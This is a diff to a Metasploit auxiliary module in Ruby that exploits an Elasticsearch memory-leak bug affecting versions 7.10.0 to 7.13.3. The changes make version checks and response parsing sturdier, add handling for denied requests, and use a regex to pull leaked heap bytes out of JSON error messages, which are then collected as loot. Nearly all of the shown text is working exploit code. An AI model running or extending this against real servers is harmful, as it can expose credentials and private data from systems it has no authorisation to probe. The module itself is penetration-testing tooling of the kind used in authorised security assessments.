@@ -68,25 +68,26 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_request_cgi(request)
 
-    return nil if res.nil?
-    return nil if res.code == 401
+    return nil unless res && res.code == 200 && !res.body.empty?
 
-    if res.code == 200 && !res.body.empty?
-      json_body = res.get_json_document
-      if json_body.empty?
-        vprint_error('Unable to parse JSON')
-        return
-      end
-    end
+    json_body = res.get_json_document
+    return nil unless json_body.is_a?(Hash) && json_body['version'].is_a?(Hash)
 
-    json_body.dig('version', 'number')
+    number = json_body['version']['number']
+    number if number.is_a?(String) && !number.empty?
   end
 
   def check_host(_ip)
     version = get_version
     return Exploit::CheckCode::Unknown("#{peer} - Could not connect to web service, or unexpected response") if version.nil?
 
-    if Rex::Version.new(version) <= Rex::Version.new('7.13.3') && Rex::Version.new(version) >= Rex::Version.new('7.10.0')
+    begin
+      detected_version = Rex::Version.new(version)
+    rescue ArgumentError
+      return Exploit::CheckCode::Unknown("Could not parse Elasticsearch version: #{version}")
+    end
+
+    if detected_version <= Rex::Version.new('7.13.3') && detected_version >= Rex::Version.new('7.10.0')
       return Exploit::CheckCode::Appears("Exploitable Version Detected: #{version}")
     end
 
@@ -154,34 +155,33 @@ class MetasploitModule < Msf::Auxiliary
     res = send_request_cgi(request)
 
     fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
-    fail_with(Failure::UnexpectedReply, "#{peer} - Invalid credentials (response code: #{res.code})") unless res.code == 400
+    fail_with(Failure::NoAccess, "#{peer} - Elasticsearch bulk request denied (HTTP #{res.code}); verify credentials and bulk privileges") if [401, 403].include?(res.code)
+    fail_with(Failure::UnexpectedReply, "#{peer} - Elasticsearch bulk request returned HTTP #{res.code}") unless res.code == 400
 
     json_body = res.get_json_document
-    if json_body.empty?
-      vprint_error('Unable to parse JSON')
-      return
-    end
-    leak1 = json_body.dig('error', 'root_cause')
-    return if leak1.blank?
+    error = json_body['error'] if json_body.is_a?(Hash)
+    return nil unless error.is_a?(Hash)
 
-    leak1 = leak1[0]['reason']
-    return if leak1.nil?
+    causes = error['root_cause']
+    return nil unless causes.is_a?(Array) && causes.first.is_a?(Hash)
 
-    leak1 = leak1.split('(byte[])"')[1].split('; line')[0]
+    reasons = [causes.first['reason'], error['reason']]
+    return nil unless reasons.all? { |reason| reason.is_a?(String) }
 
-    leak2 = json_body.dig('error', 'reason')
-    return if leak2.nil?
+    # Fixed releases describe a ByteArrayInputStream instead of exposing the
+    # backing byte array. Retain the historical dump framing when it is present.
+    leaks = reasons.map { |reason| reason[/\[Source: \(byte\[\]\)"(.*"(?:\[truncated \d+ bytes\])?); line: \d+, column: \d+\]\z/m, 1] }
+    return nil unless leaks.all?
 
-    leak2 = leak2.split('(byte[])"')[1].split('; line')[0]
-
-    "#{leak1}\n#{leak2}"
+    leaks.join("\n")
   end
 
-  def run
+  def run_host(_ip)
     memory = ''
     1.upto(leak_count) do |count|
       vprint_status("Leaking response ##{count}")
-      memory << bleed
+      leak = bleed
+      memory << leak if leak
     end
     loot_and_report(memory)
   end
